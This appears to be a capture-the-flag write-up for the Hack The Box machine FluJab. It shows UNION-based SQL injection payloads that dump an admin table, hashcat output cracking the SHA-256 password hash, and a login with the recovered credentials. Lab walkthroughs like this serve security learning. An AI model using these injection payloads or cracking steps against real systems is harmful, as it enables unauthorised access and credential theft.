## FluJab machine on HTB
### URL: https://app.hackthebox.com/machines/171
### Difficulty: Hard

## Solution
### Retrieving the Admin's account from the database
```
Query ==> hostnames
[Result #1] sysadmin-console-01.flujab.htb
[+] Payload sent: ' UNION SELECT 1, 2, GROUP_CONCAT(access), 4, 5 FROM vaccinations.admin -- -
Query ==> emails
[Result #2] syadmin@flujab.htb
[+] Payload sent: ' UNION SELECT 1, 2, GROUP_CONCAT(email), 4, 5 FROM vaccinations.admin -- -
Query ==> usernames
[Result #3] sysadm
[+] Payload sent: ' UNION SELECT 1, 2, GROUP_CONCAT(loginname), 4, 5 FROM vaccinations.admin -- -
Query ==> passwords
[Result #4] a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602
[+] Payload sent: ' UNION SELECT 1, 2, GROUP_CONCAT(password), 4, 5 FROM vaccinations.admin -- -
Query ==> 
```
### Cracking the Hash
After retrieving the hostname (`sysadmin-console-01.flujab.htb`), the username (`sysadm`), and the email address (`sysadmin@flujab.htb`), we discovered that the password for this user is stored as a hash: `a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602`.

```
soliman@Legion:~/hash-identifier$ /usr/bin/python3 hash-identifier.py
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
```

```
soliman@Legion:~$ hashcat -m 1400 hash wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-13th Gen Intel(R) Core(TM) i7-13700HX, 2848/5760 MB (1024 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 6 MB

Dictionary cache hit:
* Filename..: wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:th3doct0r

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: a3e30cce47580888f1f185798aca22ff10be617f4a982d67643...508602
Time.Started.....: Wed Jul  9 20:14:10 2025 (1 sec)
Time.Estimated...: Wed Jul  9 20:14:11 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7198.4 kH/s (0.33ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3280896/14344384 (22.87%)
Rejected.........: 0/3280896 (0.00%)
Restore.Point....: 3268608/14344384 (22.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: thaneerat -> testtest**+
Hardware.Mon.#1..: Util:  4%

Started: Wed Jul  9 20:13:58 2025
Stopped: Wed Jul  9 20:14:12 2025
soliman@Legion:~$
```
### Authentication Bypass
Login to https://sysadmin-console-01.flujab.htb:8080/view/login/normal using `sysadm`:`th3doct0r`
